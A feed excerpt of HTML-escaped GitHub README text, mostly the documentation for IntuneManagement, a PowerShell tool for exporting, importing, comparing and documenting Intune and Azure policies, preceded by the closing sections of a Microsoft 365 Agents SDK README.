 &lt;li&gt; &lt;p&gt;&lt;strong&gt;SharePoint Embedded Copilot&lt;/strong&gt;. The SharePoint Embedded Copilot SDK provides a React component that allows you to add a copilot agent to your SharePoint Embedded React application. You can dynamically scope the knowledge for the copilot interaction to a single file, folder or a set of containers mapped to the application. The SDK also allows you to configure the agent text, starter prompts and copilot instructions. Click &lt;a href=&quot;https://github.com/microsoft/SharePoint-Embedded-Samples/raw/main/Copilot/README.md&quot;&gt;here&lt;/a&gt; to learn more.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The Microsoft 365 Agents SDK brings together core components to allow for developers to create, manage and utilize AI Services and third-party SDKs to power orchestration and develop custom agent logic functionality.&lt;/p&gt; 
&lt;h2&gt;Using other services with the Agents SDK&lt;/h2&gt; 
&lt;p&gt;Your use of other services in connection with the Microsoft 365 Agents SDK is governed by the respective agreements for those services, which may include codes of conduct and other restrictions&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&quot;https://cla.opensource.microsoft.com&quot;&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; 
&lt;p&gt;This project has adopted the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/&quot;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/faq/&quot;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&quot;mailto:opencode@microsoft.com&quot;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; 
&lt;h2&gt;Recommended VS Code Extensions&lt;/h2&gt; 
&lt;p&gt;To ensure a consistent development environment, we recommend using the following VS Code extensions:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Extension&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint&quot;&gt;ESLint&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;Integrates &lt;a href=&quot;https://eslint.org/&quot;&gt;ESLint&lt;/a&gt; into VS Code. Allows you to find an fix problems in JavaScript code.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=GitHub.copilot-chat&quot;&gt;GitHub Copilot Chat&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://code.visualstudio.com/docs/copilot/overview&quot;&gt;GitHub Copilot&lt;/a&gt; is an AI peer programming tool that helps you write code faster and smarter.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=GitHub.codespaces&quot;&gt;GitHub Codespaces&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/features/codespaces&quot;&gt;GitHub Codespaces&lt;/a&gt; provides cloud-hosted development environments for any activity - whether it&#39;s a long-term project, or a short-term task like reviewing a pull request.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=ms-dotnettools.csdevkit&quot;&gt;C# Dev Kit&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;C# Dev Kit helps you manage your code with a solution explorer and test your code with integrated unit test discovery and execution, elevating your C# development experience wherever you like to develop (Windows, macOS, Linux, and even in a Codespace).&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=TeamsDevApp.vscode-adaptive-cards&quot;&gt;Adaptive Card Previewer&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;The Microsoft Adaptive Card Previewer uses the latest rendering stack for Microsoft Teams to provide a more accurate preview of Adaptive Cards. You can open a side-by-side preview to view changes live, toggle between light, dark, and high-contrast themes.&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;These are listed in &lt;code&gt;.vscode/extensions.json&lt;/code&gt;, so VS Code should prompt you to install them when you open the project.&lt;/p&gt; 
&lt;h2&gt;Trademarks&lt;/h2&gt; 
&lt;p&gt;This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow &lt;a href=&quot;https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general&quot;&gt;Microsoft&#39;s Trademark &amp;amp; Brand Guidelines&lt;/a&gt;. Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party&#39;s policies.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Micke-K/IntuneManagement</title>
      <link>https://github.com/Micke-K/IntuneManagement</link>
      <description>&lt;p&gt;Copy, export, import, delete, document and compare policies and profiles in Intune and Azure with PowerShell script and WPF UI. Import ADMX files and registry settings with ADMX ingestion. View and edit PowerShell script.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;IntuneManagement with PowerShell and WPF UI&lt;/h1&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://twitter.com/Micke_K_72&quot;&gt; &lt;img src=&quot;https://img.shields.io/twitter/follow/Micke_K_72.svg?style=social&quot; target=&quot;_blank&quot; /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;These PowerShell scripts are using Microsoft Authentication Library (MSAL), Microsoft Graph APIs and Azure Management APIs to manage objects in Intune and Azure. The scripts have a simple WPF UI and it supports operations like Export, Import, Copy, Download, Compare etc.&lt;/p&gt; 
&lt;p&gt;This makes it easy to backup or clone a complete Intune environment. The scripts can export and import objects including assignments and support import/export between tenants. The scripts will create a migration table during export and use that for importing assignments in other environments. It will create missing groups in the target environment during import. Group information like name, description and type will be imported based on the exported group e.g. dynamic groups are supported. There will be one json file for each group in the export folder.&lt;/p&gt; 
&lt;p&gt;The script also support dependencies e.g. an App Protection is depending on an App, Policy Sets are depending on Compliance Policies, objects has Scope Tags etc. Dependency support requires exported json files and that the dependency objects are imported in the environment. The script uses the exported json files to get the Id and names of the exported object and uses that information and updates Id&#39;s before import an object from a json file. The Bulk Import form shows the import order of the objects. The objects with the lowest order number will be imported first.&lt;/p&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;img src=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/IntuneManagement.PNG&quot; height=&quot;80%&quot; width=&quot;80%&quot; /&gt; &lt;/p&gt; 
&lt;p&gt;This PowerShell application is based on the foundation modules CloudAPIPowerShellManagement and Core. These modules manages UI, settings, logging etc. The functionality for the application is located in the extension modules. This makes it easy to add/remove features, views etc. Additional features will be added...&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Security note:&lt;/strong&gt; Since the scripts are not signed, a warning might be display when running it and files might be blocked. The script will unblock all files. This is to avoid issues that it fails to load the MSAL library etc. If there are any security concerns, the PowerShell code can be reviewed and the DLL files can be downloaded manually from Microsoft repositories, see links below. The DLL files &lt;em&gt;CAN&lt;/em&gt; be removed but MSAL is a pre-requisite for authentication. The script will try to find the DLL in the Az or MSAL.PS module if not found in the script root directory. DLL files are included to reduce dependencies.&lt;/p&gt; 
&lt;h2&gt;Starting the App&lt;/h2&gt; 
&lt;p&gt;Before starting the app:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The CMD files needs to be unblocked before the app can be started. The app can be started without it but Windows will prompt with a security warning.&lt;/li&gt; 
 &lt;li&gt;The script will unblock all other files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Before logging on:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The app will use the Intune PowerShell Azure Enterprise Application by default and only use the permissions granted to that appliction. Disable &lt;strong&gt;Use Default Permissions&lt;/strong&gt; in Settings to request additional permissions. This will cause a consent prompt if one or more permissions are missing for the app. &lt;strong&gt;Note:&lt;/strong&gt; If the app has not been approved for the organization, a consent prompt will be displayed.&lt;/li&gt; 
 &lt;li&gt;Enable &lt;strong&gt;Get Tenant List&lt;/strong&gt; in Settings if accessing multiple environments with the same account e.g. a guest account in other tenants. This might cause a Consent prompt&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Start the script by running &lt;strong&gt;Start.cmd&lt;/strong&gt;, &lt;strong&gt;Start-WithJson.cmd&lt;/strong&gt;, &lt;strong&gt;Start-WithConsole.cmd&lt;/strong&gt; or &lt;strong&gt;Start-IntuneManagement.ps1&lt;/strong&gt;. &lt;strong&gt;Start-WithConsole.cmd&lt;/strong&gt; will leave the command prompt window open so you can see the log while running the app.&lt;/p&gt; 
&lt;h2&gt;Silent Batch Job (Beta)&lt;/h2&gt; 
&lt;p&gt;The script can be executed without UI. This is to support DevOps environment.&lt;/p&gt; 
&lt;p&gt;Silent batch job is supported by the following features:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Export&lt;/li&gt; 
 &lt;li&gt;Import&lt;/li&gt; 
 &lt;li&gt;Documentation&lt;/li&gt; 
 &lt;li&gt;Compare&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The Silent Batch Job feature requires an Azure App to be configured with a secret or a certificate. The app must also be delegated with the required permissions to Graph objects used by the tool.&lt;/p&gt; 
&lt;p&gt;The silent feature uses an exported json file with settings for the specified operation. This file can be generated in the Bulk Export/Import forms. Required settings for the silent job is configured in the form and then exported to a file. The path to the file is then passed on the command line. The file can be used for multiple environments if the &lt;strong&gt;Add company name to the path&lt;/strong&gt; option is selected. Note that this requires that the app must have at least read permission on the Organizations API.&lt;/p&gt; 
&lt;p&gt;The following variables can be used in the path and filename:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;%Date% - This will be translated to yyyy-MM-dd format (eg 2020-02-27)&lt;/li&gt; 
 &lt;li&gt;%DateTime% - This will be translated to yyyyMMdd-HHmm format (eg 20200227-1750)&lt;/li&gt; 
 &lt;li&gt;%Organization% - Name of the tenant&lt;/li&gt; 
 &lt;li&gt;Any environment variable&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The tool will by default generate the files; &lt;code&gt;BulkExport.json&lt;/code&gt; and &lt;code&gt;BulkImport.json&lt;/code&gt;. These files can be merged into one file but that must be done manually. These files can also be edited manually. Each setting represents a control in the UI form. When the script is triggered silently, it will create the form in the background, populate it with the values from the file and then trigger the bulk function.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; The Silent Batch feature use settings configured in the UI. If this is triggered in a DevOps envionment, it is recommended to generate a settings JSON file with the desired settings and then use that in the DevOps environment&lt;/p&gt; 
&lt;p&gt;The app authentication can either be passed on the command line or stored in the settings. Tennant Settings is required for multiple environments.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Command line example:&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Start-IntuneManagement.ps1 -Silent -TenantId &quot;&amp;lt;&lt;em&gt;TenantID&lt;/em&gt;&amp;gt;&quot; -SilentBatchFile &amp;lt;&lt;em&gt;PathToFile&lt;/em&gt;&amp;gt; [-AppId &amp;lt;&lt;em&gt;AppId&lt;/em&gt;&amp;gt;] [-Secret &amp;lt;&lt;em&gt;Secret&lt;/em&gt;&amp;gt; | -Certificate &amp;lt;&lt;em&gt;CertThumb&lt;/em&gt;&amp;gt;]&lt;/p&gt; 
&lt;p&gt;Start-IntuneManagement.ps1 -Silent -SilentBatchFile &quot;C:\Temp\BatchImport.json&quot; -TenantId &quot;00000000-0000-0000-0000-000000000000&quot; -AppId &quot;00000000-0000-0000-0000-000000000001&quot; -Secret &quot;KJ76P~B9###9-.8I####-_MySecret&quot;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Setting example:&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Start-IntuneManagement.ps1 -Silent -SilentBatchFile &quot;C:\Temp\BatchImport.json&quot; -TenantId &quot;00000000-0000-0000-0000-000000000000&quot;&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;This script has an extension that can document profiles and policies in Intune. The output is using the same language strings as the Intune portal.&lt;/p&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/Documentation.md&quot;&gt;Documentation&lt;/a&gt; for more information&lt;/p&gt; 
&lt;h2&gt;Import&lt;/h2&gt; 
&lt;p&gt;The script can import the exported json files in multiple ways.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Always import:&lt;/strong&gt; The script will try to import the file. It will not check if it exists. This is the default behavior&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Skip if object exists:&lt;/strong&gt; The script will look if there is an existing object with the same name and type. It will not import the file if existing object is detected&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Replace (Preview):&lt;/strong&gt; If an existing object is detected, the script will&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Import the file without assignments&lt;/li&gt; 
   &lt;li&gt;Copy assignments from the existing object&lt;/li&gt; 
   &lt;li&gt;Run PostReplace commands - Priority will be set for Enrollment Restrictions etc.&lt;/li&gt; 
   &lt;li&gt;Update PolicySets object(s) to use the new imported object (detected by policySet assignments)&lt;/li&gt; 
   &lt;li&gt;Delete the original object&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Update (Preview):&lt;/strong&gt; This will update the existing object.&lt;/p&gt; &lt;p&gt;The update APIs do not support all the properties that the import APIs do and object types behaves differently during update e.g. Settings for &lt;strong&gt;Endpoint Security&lt;/strong&gt; objects will not be cleared. There is no API for removing settings, only adding. If a setting does not exist in the import file, the existing setting will be set to &lt;em&gt;Not Configured&lt;/em&gt;. &lt;strong&gt;Settings Catalog&lt;/strong&gt; replaces the whole settings property during update.&lt;/p&gt; &lt;p&gt;This has been tested with all supported object types &lt;em&gt;except&lt;/em&gt; Import Scripts (Shell), Android OEM Config and Apple Enrollment Types.&lt;/p&gt; &lt;p&gt;Each application type works differently. Update functionality has been tested on Win32, Windows MSI LoB, iOS Store, Microsoft Store and Microsoft 365 (Windows and MacOS).&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;WARNING:&lt;/strong&gt; Use Replace with caution! Replace will delete the existing object after a new object is imported and the assignments are copied, but it could cause issues in the environment if something in the process goes wrong. Replacing single objects can break references e.g. replacing an Application can break AutoPilot profiles, App Protection and App Configuration policies. Verify the process in a test environment before using this!&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Recommendation:&lt;/strong&gt; Backup all policies before running Replace/Update.&lt;/p&gt; 
&lt;p&gt;The Replace/Update feature can be used in a scenario where all profiles/policies are managed in a separate reference (Dev/Test) and then implemented in one or more destination environments. The existing objects will then be reset to have the same settings as the reference environment&lt;/p&gt; 
&lt;h2&gt;Comparison&lt;/h2&gt; 
&lt;p&gt;This script has an extension that can compare objects in Intune with exported json files. It will display a data grid with the values and highlight updated values with red.&lt;/p&gt; 
&lt;p&gt;Objects can be compared based on property values or documented values.&lt;/p&gt; 
&lt;p&gt;The property value method is a quick way to compare objects but it will only show the names and values of the native Intune object. This is not a good comparison method for Settings objects since they have all the settings in one property.&lt;/p&gt; 
&lt;p&gt;The documentation method is a bit slower but will show the values as they are stated in the Intune portal. This is the recommended way to compare objects but note that this is only supported on object types that supports documentation.&lt;/p&gt; 
&lt;p&gt;Bulk compare is supported. This can be performed in two ways:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Intune Objects with Exported Files&lt;/strong&gt; - This will read each exported file and compare it with the existing object&lt;/p&gt; &lt;p&gt;The result file will be stored in the exported folder structure. Either in the Object Type folder or the parent folder depending on the Save as setting.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This cannot be used with files exported from a different environment since it used the Id as identifier&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Named Objects in Intune&lt;/strong&gt; - Compare Intune objects based on patterns&lt;/p&gt; &lt;p&gt;This can be used in where a pattern is used separate objects between different environments e.g. [Test] Policy 1 vs [Prod] Policy 1.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Files in Exported Folders&lt;/strong&gt; - Compare two exported folders&lt;/p&gt; &lt;p&gt;This can be used in where a pattern is used separate objects between different environments e.g. [Test] Policy 1 vs [Prod] Policy 1.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Output files are by default stored in the My Documents folder.&lt;/p&gt; 
&lt;p&gt;The output CSV can either be one file for ALL objects or one file for each Object Type.&lt;/p&gt; 
&lt;h2&gt;Bulk Copy&lt;/h2&gt; 
&lt;p&gt;Bulk copy can be used to clone objects based on a name pattern. This can be used in the same scenario as Bulk Compare where the object names includes an environment identifier. The application will identify all objects matching the source pattern and copy each object with a new name matching the &#39;Copy object name pattern&#39;. The object will not be copied if it detects that an object already exists with the new name.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Assignments will NOT be copied.&lt;/p&gt; 
&lt;h2&gt;Intune Tools&lt;/h2&gt; 
&lt;p&gt;Additional Intune Tools is included in the script.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;ADMX Import&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Import 3rd part ADMX settings like Chrome etc. by using a UI similar to GPMC&lt;/li&gt; 
   &lt;li&gt;Support for any language if there is an ADML file for it&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Reg Values&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Create registry settings in HKLM or HKCU. Supported value types: 
    &lt;ul&gt; 
     &lt;li&gt;String&lt;/li&gt; 
     &lt;li&gt;Multi-String&lt;/li&gt; 
     &lt;li&gt;Expandable String&lt;/li&gt; 
     &lt;li&gt;DWORD&lt;/li&gt; 
     &lt;li&gt;List (Key/Value pair)&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;This tool creates a custom ADMX file based on the specified registry keys.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Intune Assignments&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Quickly gather all assignments from an export&lt;/li&gt; 
   &lt;li&gt;Easily identify all profiles/policies a group is assigned to&lt;/li&gt; 
   &lt;li&gt;Export as CSV to analyse in Excel&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/ADMXImport.md&quot;&gt;ADMX Import&lt;/a&gt; for more information about the ADMX tools&lt;/p&gt; 
&lt;h2&gt;Columns&lt;/h2&gt; 
&lt;p&gt;Custom columns is supported. The script will by default add id, displayName and description with exception for some object types. These are configured in the EndpointManager.ps1 and EndpointManagerInfo.psm1 files.&lt;/p&gt; 
&lt;p&gt;Custom columns can be added for each Object Type in the detailed view of an Object.&lt;/p&gt; 
&lt;p&gt;Custom Columns settings are stored in the regitry, in HKCU\SOFTWARE\CloudAPIPowerShellManagement\EndpointManager\ObjectColumns\&lt;em&gt;ObjectType&lt;/em&gt;.&lt;/p&gt; 
&lt;p&gt;The &lt;em&gt;ObjectType&lt;/em&gt; value represents the ViewItem ID specified in the EndpointManager.ps1 and EndpointManagerInfo.psm1 files. This is also the same as the parent folder when items are exported.&lt;/p&gt; 
&lt;p&gt;The REG_SZ value has the following syntax:&lt;/p&gt; 
&lt;p&gt;[0|1],Property1[=Header1],Property2[=Header2],...&lt;/p&gt; 
&lt;p&gt;0|1 - Optional value specifying if columns are added or replacing default columns&lt;/p&gt; 
&lt;p&gt;0 = Replace default columns with columns specified in the registry value 1 = Add columns specified in the registry to the default columns. This is default setting.&lt;/p&gt; 
&lt;p&gt;PropertyX - Property to display. View an object to see available properties&lt;/p&gt; 
&lt;p&gt;HeaderX - Optional value for the column header. Property name will be used if this is not specified.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Some object types returns multiple object types, @OData.Type. If a custom column is added but the property does not exist on all the object types that were returned, the column value will be empty. The code will &lt;strong&gt;not&lt;/strong&gt; break if the property is missing on one or more returned objects.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Example 1:&lt;/strong&gt; Reg key: HKCU\SOFTWARE\CloudAPIPowerShellManagement\EndpointManager\ObjectColumns\DeviceConfiguration&lt;/p&gt; 
&lt;p&gt;REG_SZ value: &lt;strong&gt;lastModifiedDateTime&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;This will add the &lt;strong&gt;lastModifiedDateTime&lt;/strong&gt; to the existing columns.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Example 2:&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Reg key: HKCU\SOFTWARE\CloudAPIPowerShellManagement\EndpointManager\ObjectColumns\TermsOfUse&lt;/p&gt; 
&lt;p&gt;REG_SZ value: 0,id=Id,displayName=Name,files[0].displayName=Display Name&lt;/p&gt; 
&lt;p&gt;This will replace the default columns and add new columns with specific header.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Sub-properties are supported e.g. &lt;strong&gt;files[0].displayName&lt;/strong&gt;. This will add a column based on the first object in the files property.&lt;/p&gt; 
&lt;h2&gt;Change log&lt;/h2&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/ReleaseNotes.md&quot;&gt;Change Log&lt;/a&gt; for more information&lt;/p&gt; 
&lt;h2&gt;Authentication&lt;/h2&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/MSALInfo.md&quot;&gt;MSAL Info&lt;/a&gt; for more information about authentication&lt;/p&gt; 
&lt;h2&gt;Settings&lt;/h2&gt; 
&lt;p&gt;Settings for the script is default stored in the registry. However, the script supports settings to be stored in a json file so it can be copied between computers. Registry settings can be exported in the Settings dialog.&lt;/p&gt; 
&lt;p&gt;To use settings based on a json file:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;Start-IntuneManagement.ps1 -JSonSettings [-JSonFile &amp;lt;PathToFile&amp;gt;]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If only -JSonSettings is used the script will use the default json setting file:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;%LOCALAPPDATA%\CloudAPIPowerShellManagement\Settings.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Use -JSonFile for custom location of the file&lt;/p&gt; 
&lt;p&gt;Start-WithJson.cmd is included as an example on how to start the script with json settings.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; If the file can&#39;t be created, the script will revert back registry. Make sure that the script can write to the file. It is not recommended to store the file in a folder that requires UAC to get write permissions.&lt;/p&gt; 
&lt;h2&gt;Supported Intune objects&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;ADMX Files [^1]&lt;/li&gt; 
 &lt;li&gt;App Configurations (App and Device)&lt;/li&gt; 
 &lt;li&gt;App Protection&lt;/li&gt; 
 &lt;li&gt;Applications [^2]&lt;/li&gt; 
 &lt;li&gt;Apple Enrolment Types - NOT fully tested&lt;/li&gt; 
 &lt;li&gt;Autopilot profiles&lt;/li&gt; 
 &lt;li&gt;Baseline Security profiles&lt;/li&gt; 
 &lt;li&gt;Compliance policies&lt;/li&gt; 
 &lt;li&gt;Compliance policies v2&lt;/li&gt; 
 &lt;li&gt;Compliance scripts&lt;/li&gt; 
 &lt;li&gt;Conditional Access&lt;/li&gt; 
 &lt;li&gt;Custom Attributes&lt;/li&gt; 
 &lt;li&gt;Device Configuration (Administrative Templates, Configuration Policies, Android OEM Config, Settings Catalog)&lt;/li&gt; 
 &lt;li&gt;Endpoint Security (Account Protection, Disk Encryption, Firewall, Security Baselines etc.) [^3]&lt;/li&gt; 
 &lt;li&gt;Enrollment Restrictions&lt;/li&gt; 
 &lt;li&gt;Enrollment Status Page profiles&lt;/li&gt; 
 &lt;li&gt;Feature Updates&lt;/li&gt; 
 &lt;li&gt;Filters&lt;/li&gt; 
 &lt;li&gt;Intune Branding (Company Portal)&lt;/li&gt; 
 &lt;li&gt;Locations&lt;/li&gt; 
 &lt;li&gt;Named Locations&lt;/li&gt; 
 &lt;li&gt;Notifications&lt;/li&gt; 
 &lt;li&gt;Policy Sets&lt;/li&gt; 
 &lt;li&gt;Quality Updates&lt;/li&gt; 
 &lt;li&gt;Reusable Settings&lt;/li&gt; 
 &lt;li&gt;Role Definitions&lt;/li&gt; 
 &lt;li&gt;Scope Tags&lt;/li&gt; 
 &lt;li&gt;Scripts (PowerShell and Shell scripts, supports download of script)&lt;/li&gt; 
 &lt;li&gt;Terms and Conditions&lt;/li&gt; 
 &lt;li&gt;Terms of Use&lt;/li&gt; 
 &lt;li&gt;Update Policies&lt;/li&gt; 
 &lt;li&gt;Co-management Settings&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;[^1]: ADMX file must be located in the export folder or in the folder defined in Settings. Administrative Template policies based on ADMX files must be imported after the ADMX file is imported. [^2]: Export is support but .intunewin files will not be exported. The .intunewin file must exist in the exported folder or in the folder defined in Settings -&amp;gt; App packages folder. [^3]: Some Endpoint Security policies will be exported to the SettingsCatalg since they are based the Settings Catalog API.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The scripts are using the BETA version of the Graph API which might change at any time.&lt;/p&gt; 
&lt;h2&gt;Azure Management APIs&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Tenants for the current user&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Azure Management APIs are undocumented APIs which might not be supported and they might change at any time.&lt;/p&gt; 
&lt;h2&gt;Pre-requisites&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;.Net 4.7&lt;/li&gt; 
 &lt;li&gt;PowerShell 5.1&lt;/li&gt; 
 &lt;li&gt;MSAL 
  &lt;ul&gt; 
   &lt;li&gt;Microsoft.Identity.Client.dll version 4.42.1.0 is included in this version&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;License and permissions in Azure to manage objects in Intune and Azure&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;References&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/graph/api/overview?toc=./ref/toc.json&amp;amp;view=graph-rest-beta&quot;&gt;Microsoft Graph API&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.nuget.org/packages/Microsoft.Identity.Client/&quot;&gt;Microsoft.Identity.Client&lt;/a&gt; (MSAL download)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/AzureAD/MSAL.PS&quot;&gt;MSAL.PS Module&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az&quot;&gt;Az PowerShellModule&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/microsoft/Intune-PowerShell-SDK&quot;&gt;Microsoft Intune PowerShell Module&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.nuget.org/packages/Microsoft-WindowsAPICodePack-Core&quot;&gt;Microsoft.WindowsAPICodePack&lt;/a&gt; and &lt;a href=&quot;https://www.nuget.org/packages/Microsoft-WindowsAPICodePack-Shell&quot;&gt;Microsoft.WindowsAPICodePack.Shell&lt;/a&gt; for Browse Folder dialogs&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Acknowledgments&lt;/h2&gt; 
&lt;p&gt;The app encryption and upload is based on &lt;a href=&quot;https://github.com/microsoftgraph/powershell-intune-samples&quot;&gt;Graph PowerShell Intune Examples&lt;/a&gt;&lt;br /&gt; Some MSAL functionalities are based on &lt;a href=&quot;https://github.com/AzureAD/MSAL.PS&quot;&gt;MSAL.PS Module&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Known Issues&lt;/h2&gt; 
&lt;p&gt;Device Configuration and App Configuration objects are split up in different object types. They are using different Graph APIs and each object type in the menu uses one API. This is also why all Endpoint Security objects are of the same object type. They use the same API but are separated based on the Baseline Template Id they use.&lt;/p&gt; 
